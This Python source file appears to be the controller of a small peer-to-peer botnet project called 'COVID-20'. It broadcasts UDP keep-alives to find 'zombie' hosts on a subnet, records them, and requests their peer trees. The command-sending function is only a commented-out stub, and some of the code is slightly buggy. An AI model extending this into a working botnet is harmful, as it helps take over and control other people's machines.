import socket
import time
from Zombie import Zombie
import Protocol

from Utils import safe_cast


class BotMater:
    def __init__(self, my_ip, gateway, subnet):

        self.network = my_ip
        self.gateway = gateway
        self.subnet = subnet

        self.__udp_port = 54000
        self.__tcp_port = 55000
        self.__udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.__udp_sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        self.__udp_sock.bind(('', 0))

        self.zombie_lst = []

    # =========================================================================== #

    def __zombie_exists(self, zombie):
        for z in self.zombie_lst:
            if zombie.equals(z):
                return True
        return False

    def __choose_zombie_index(self, index):
        try:
            zombie = self.zombie_lst[index]
            return zombie
        except IndexError:
            print("--invalid zombie index--")

    def __add_zombie(self, adr):

        """

        :param adr: (ip, port) - tuple
        :return: if successful - the added zombie obj
                else - None.
        """
        # build a zombie object
        zombie = Zombie(adr)

        # if not already in list
        if not self.__zombie_exists(zombie):
            self.zombie_lst.append(zombie)  # add zombie
            return zombie

    def __find_node(self, zombie: Zombie, zombie_lst):
        """
        :param base_adr: base_node
        :return: the node from the botnet tree.
        """

        for z in zombie_lst:
            if z.equals(zombie):
                return z
            else:
                return self.__find_node(zombie, z.branches)

    # =========================================================================== #

    def show_zombies(self):
        for zombie_index in range(len(self.zombie_lst)):
            print('[+]', zombie_index, self.zombie_lst[zombie_index].adr)

    def search_for_bots(self):
        """
        Sends broadcast msgs in the subnet.
        Searching for bots in local network.
        """
        data = Protocol.keep_alive()
        # broad cast address (gateway | ~(subnet)) => broadcast
        self.__udp_sock.sendto(data, (Protocol.int2ip(Protocol.ip2int(self.gateway)
                                                      | ~Protocol.ip2int(self.subnet) + 2 ** 32),
                                      self.__udp_port))

    def get_zombie_tree(self):
        # get users zombie choice (1 hop zombies)
        opt = safe_cast(input("\t[+][get_zombie_tree] choose a zombie index (-1 for canceling)\n\t"), int, default=-1)

        # cancel if -1
        if opt == -1:
            return

        # get the zombie from list
        zombie: Zombie = self.__choose_zombie_index(opt)

        # check if user entered valid index
        if zombie:
            # create network sync request
            p2p = Protocol.P2PCommunication()

            # command useless => default build
            command = Protocol.Command()

            # create botnet pack based on the COVID-20 protocol
            botnet_pack = Protocol.BotnetPack(type=Protocol.TYPES.NETWORK_SYNC_REQUEST,
                                              p2pCommunication=p2p,
                                              command=command)

            # send request to zombie
            self.__udp_sock.sendto(botnet_pack.create_byte_stream(), zombie.adr)

    def send_command(self):
        """
        TODO --
        adr = None
        command = Protocol.Command()
        p2p_communication = Protocol.P2PCommunication()
        p2p_communication.dst_ip = 0
        p2p_communication.dst_port = 0
        p2p_communication.pdst_ip = socket.htonl(Protocol.ip2int("192.168.8.2"))
        p2p_communication.pdst_port = 61650

        pack = Protocol.BotnetPack(type=Protocol.TYPES.COMMAND,
                                   command=command,
                                   p2pCommunication=p2p_communication)
        self.__udp_sock.sendto(pack.create_byte_stream(), adr)
        """

    # =========================================================================== #

    def handle_incomings(self):
        """
        Handles incoming msgs for implementing the COVID-20 project protocol.
        """

        while True:

            # get the raw data and adr tup (ip, port)
            data, adr = self.__udp_sock.recvfrom(1024)

            # extract the protocol type
            type = Protocol.get_type(data)

            # go over the possible options
            if type == Protocol.TYPES.KEEP_ALIVE_ACK:  # ======

                # add the zombie (managing duplicates in func)
                self.__add_zombie(adr)

            elif type == Protocol.TYPES.NETWORK_SYNC_REPLY:  # ======

                # get the base node
                base_adr, n_branches = Protocol.get_base(data)

                # get the base node's branches as a list
                z_adr_lst = Protocol.get_peer_branches(data)

                # check if local peer
                if base_adr == ('0.0.0.0', 0):

                    # add the zombie
                    zombie = self.__add_zombie(adr)  # raw address client

                else:

                    # find the node in the botnet tree
                    zombie = self.__find_node(Zombie(base_adr), self.zombie_lst)

                # add zombie's branches
                for z_adr in z_adr_lst:
                    zombie.add_zombie(Zombie(z_adr))

        time.sleep(0.05)
